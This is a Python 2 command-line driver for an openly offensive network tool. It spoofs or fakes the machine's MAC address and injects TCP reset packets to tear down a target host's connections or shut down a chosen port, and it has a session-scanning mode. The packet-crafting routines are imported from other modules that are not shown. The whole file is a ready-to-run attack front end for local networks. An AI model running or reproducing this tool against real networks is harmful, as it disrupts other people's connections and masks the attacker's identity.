#!/bin/python

# Copyright (c) 2014-2016 Andrea Baldan
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

import os
import optparse
import core.config
from core.utils import *
from core.mitm import *

def parse_arguments():
	""" parse arguments """
	parser = optparse.OptionParser('Usage: %prog [options] dev')
	parser.add_option('-0', '--spoof', action = 'store_const', const = 1, dest = 'mode', help = 'Spoof mode, generate a fake MAC address to be used during attack')
	parser.add_option('-1', '--sessions-scan', action = 'store_const', const = 2, dest = 'mode', help = 'Sessions scan mode')
	parser.add_option('-m', dest = 'macaddr', help = 'Mac address')
	parser.add_option('-s', dest = 'source', help = 'Source ip address (e.g. a class C address like 192.168.1.150) usually the router address')
	parser.add_option('-t', dest = 'target', help = 'Target ip address (e.g. a class C address like 192.168.1.150)')
	parser.add_option('-p', dest = 'port', help = 'Target port to shutdown')
	parser.add_option('-v', '--verbose', action = 'store_const', const = 1, dest = 'verbosity', help = 'Verbose output mode')
	parser.add_option('-d', '--dotted', action = 'store_const', const = 1, dest = 'dotted', help = 'Dotted output mode')
	return parser.parse_args()

# check privileges (low level socket and pcap require root)
if not os.geteuid() == 0:
	sys.exit('You must be root.')

(options, args) = parse_arguments()

mac_addr = ""
print ""
if len(args) != 1:
	print sys.argv[0] + ' -h for help'
	print '[!] Must specify interface'
	exit()

if not options.target:
	print '[!] Must specify target address'
	exit()

if options.verbosity == 1:
	core.config.verbose = True

if options.dotted == 1:
	core.config.dotted = True

if not options.source:
	try:
		options.source = get_default_gateway_linux()
	except:
		print "[!] Unable to retrieve default gateway, please specify one using -s option"
		sys.exit(2)

if not options.macaddr and options.mode != 1:
	try:
		options.macaddr = get_mac_addr(args[0])
		mac_addr = options.macaddr
	except:
		print "[!] Unable to retrieve a valid MAC address for device %s, please specify one using -m option"
		sys.exit(2)

if options.mode == 1:
	if not options.macaddr:
		try:
			fake_mac = fake_mac_address()
			change_mac(args[0], fake_mac)
			print "[+] Fake MAC generated " + G + fake_mac + W + ""
		except:
			print "[!] Unable to change MAC address to device %s" % args[0]
			sys.exit(2)
		print "[+] Using " + G + fake_mac + W + " MAC address"
		if options.port:
			rst_inject(args[0], parse_mac(fake_mac), options.source, options.target, options.port)
		else:
			rst_inject(args[0], parse_mac(fake_mac), options.source, options.target)
		change_mac(args[0], mac_addr)
	else:
		changed = False
		mac_addr = options.macaddr
		print "[+] Using " + G + mac_addr + W + " MAC address"
		original_mac_addr = get_mac_addr(args[0])
		if parse_mac(mac_addr) != parse_mac(original_mac_addr):
			change_mac(args[0], mac_addr)
			changed = True
		if options.port:
			rst_inject(args[0], parse_mac(mac_addr), options.source, options.target, options.port)
		else:
			rst_inject(args[0], parse_mac(mac_addr), options.source, options.target)
		if changed == True:
			change_mac(args[0], original_mac_addr)

elif options.mode == 2:
	get_sessions(args[0], options.target)

else:
	mac_addr = options.macaddr
	print "[+] Using " + G + mac_addr + W + " MAC address"
	print "[+] Set " + G + options.source + W + " as default gateway"
	if options.port:
		rst_inject(args[0], parse_mac(mac_addr), options.source, options.target, options.port)
	else:
		rst_inject(args[0], parse_mac(mac_addr), options.source, options.target)
